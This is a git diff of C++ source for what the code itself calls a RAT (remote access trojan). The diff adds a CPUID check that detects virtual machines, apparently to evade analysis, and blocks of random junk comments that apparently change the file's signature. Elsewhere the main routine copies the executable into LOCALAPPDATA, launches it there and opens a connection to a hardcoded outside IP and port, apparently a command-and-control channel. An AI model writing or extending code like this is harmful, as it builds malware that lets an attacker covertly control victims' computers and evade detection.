@@ -1,5 +1,16 @@
 #include <iostream>
+#include <intrin.h>
 #include "Connection.h"
+
+
+//Check if the software running on VM
+bool vmCheck() {
+    unsigned int info[4]; // EAX , EBX , ECX , EDX
+    //
+    __cpuid((int *) info, 1); // 1 is pass to EAX
+    //Checking if the 31st bit of EXC is true or false
+    return ((info[2] >> 31) == 1); //if its 1 so the exe running on vm if not so its running on physical machine
+}
 
 
 //Creating a new same RAT in C:\\C_projects\\test001.exe
@@ -28,9 +39,12 @@ bool moveFilePlace() {
     cout << "path is " << path << endl;
     if (hFileRead == INVALID_HANDLE_VALUE) {
         cout << "Cant open handle to the file" << endl;
+        CloseHandle(hFileRead);
         return false;
+
     } else if (hFileWrite == INVALID_HANDLE_VALUE) {
         cout << "Cant open handle to the file2" << endl;
+        CloseHandle(hFileWrite);
         return false;
     }
 
@@ -45,26 +59,44 @@ bool moveFilePlace() {
     return true;
 }
 
+//fdsafewf
+//f3d 23s 432 432a4 32f432 432
+// rewfdsafdsa
+// ffdsafdsa
+//  r3
+//  24 32 432
+//   fdsewf
+
 
 int main() {
 
-    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
-
+    //Checking if the file test001.exe is exist
     if (moveFilePlace()) {
         string path = getenv("LOCALAPPDATA");
         cout << "The command is " << "cd " + path + "&& start test001.exe" << endl;
         system(("cd " + path + "&& start test001.exe").c_str());
     } else {
+        ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
         string ip = "141.226.121.68";
         int port = 9087;
-
         Connection *connection = new Connection(ip, port);
         BOOL success = connection->boot();
-        if (success)
-            connection->sendMessage("Can't place the exe in the windows boot startup");
-        else
-            connection->sendMessage("The exe is in windows boot startup");
+        //if (success)
+        //connection->sendMessage("Can't place the exe in the windows boot startup");
+        //else
+        //connection->sendMessage("The exe is in windows boot startup");
         connection->connection();
     }
     return 0;
 }
+
+
+
+
+//fd3bvcx12321sfdsbcxvaafewf
+//f3cxvcz21bvzc33d 23bvs 43xcvz221 3bxcv21 32f32cxbv1432 43xcbv3212
+// rezxvcwfzvczdsafd213sa
+// ffdsabvczcfdsa
+//  r3fdsafdsvbcx
+//  24 32 hgf432
+//   fd32`11sew321f
